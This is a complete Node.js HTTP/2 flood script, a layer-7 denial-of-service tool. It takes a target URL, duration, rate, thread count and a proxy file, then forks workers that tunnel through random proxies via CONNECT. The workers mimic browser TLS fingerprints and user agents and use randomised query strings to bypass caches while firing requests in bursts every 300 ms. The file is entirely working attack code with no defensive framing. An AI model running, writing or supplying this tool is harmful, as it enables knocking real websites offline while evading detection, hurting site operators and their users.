const net    = require("net"),
      http2  = require("http2"),
      tls    = require("tls"),
      cluster= require("cluster"),
      { parse } = require("url"),
      { constants, randomBytes } = require("crypto"),
      { readFileSync } = require("fs"),
      { totalmem, freemem } = require("os");

const [,, target, time, rate, threads, proxyFile] = process.argv;
if (!threads) return console.error("Usage: host time req thread proxy.txt") && process.exit(1);

const proxies = readFileSync(proxyFile,"utf8").trim().split(/\r?\n/);
const opts = { target, time: +time, rate: +rate, threads: +threads };
const parsed = parse(target);

const defaultCiphers = constants.defaultCoreCipherList.split(":");
const ciphers = ["GREASE", ...defaultCiphers.slice(0,3).reverse(), ...defaultCiphers.slice(3)].join(":");
const sigalgs = ["ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256",
                 "ecdsa_secp384r1_sha384","rsa_pss_rsae_sha384","rsa_pkcs1_sha384",
                 "rsa_pss_rsae_sha512","rsa_pkcs1_sha512"].join(":");
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOpts = constants.SSL_OP_NO_SSLv2|constants.SSL_OP_NO_SSLv3|
                   constants.SSL_OP_NO_TLSv1|constants.SSL_OP_NO_TLSv1_1|
                   constants.SSL_OP_NO_TLSv1_3|constants.ALPN_ENABLED|
                   constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|
                   constants.SSL_OP_CIPHER_SERVER_PREFERENCE|
                   constants.SSL_OP_LEGACY_SERVER_CONNECT|
                   constants.SSL_OP_COOKIE_EXCHANGE|
                   constants.SSL_OP_PKCS1_CHECK_1|constants.SSL_OP_PKCS1_CHECK_2|
                   constants.SSL_OP_SINGLE_DH_USE|constants.SSL_OP_SINGLE_ECDH_USE|
                   constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder:true, secureProtocol:"TLS_method", secureOptions:secureOpts });

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 Version/16.4 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/605.1.15"
];

const rand = (arr) => arr[Math.floor(Math.random()*arr.length)];
const randString = (min,max) => randomBytes(Math.ceil((max-min)/2)).toString("hex").slice(0,Math.floor(Math.random()*(max-min+1))+min);

if (cluster.isMaster) {
  console.log(`→ Target: ${target} | Time: ${time}s | Rate: ${rate}/s | Threads: ${threads}`);
  for(let i=0;i<threads;i++) cluster.fork();
  setInterval(()=>{
    const used = totalmem()-freemem();
    if (used/totalmem()*100>80) {
      Object.values(cluster.workers).forEach(w=>w.kill());
      for(let i=0;i<threads;i++) cluster.fork();
    }
  },5000);
  setTimeout(()=>process.exit(), opts.time*1000);
} else {
  const makeRequests = () => {
    const hdrs = {
      ":method":"GET",
      ":scheme":"https",
      ":authority":parsed.host,
      ":path":parsed.path+"?"+randString(5,10)+"="+randString(10,25),
      "user-agent": rand(userAgents),
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": rand(["no-cache","max-age=0"]),
      "pragma": "no-cache"
    };
    const proxySet = proxies.sort(()=>0.5-Math.random()).slice(0,3);
    proxySet.forEach(p=>{
      const [host,port] = p.split(":");
      const socket = net.connect({ host, port:+port },()=>{
        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost:${parsed.host}\r\n\r\n`);
      });
      socket.once("data",chunk=>{
        if (!chunk.includes("200")) return socket.destroy();
        const tlsConn = tls.connect({
          socket, servername:parsed.host, ALPNProtocols:["h2"],
          ciphers:rand(ciphers.split(":")), sigalgs: sigalgs.split(":"), ecdhCurve,
          secureContext, secureOptions:secureOpts, rejectUnauthorized:false
        },()=>{
          const client = http2.connect(target,{ createConnection:()=>tlsConn });
          for(let i=0;i<rate;i++) client.request(hdrs).on("response",()=>{}).end();
        });
        tlsConn.on("error",()=>socket.destroy());
      });
      socket.on("error",()=>{});
    });
  };
  setInterval(makeRequests,300);
}
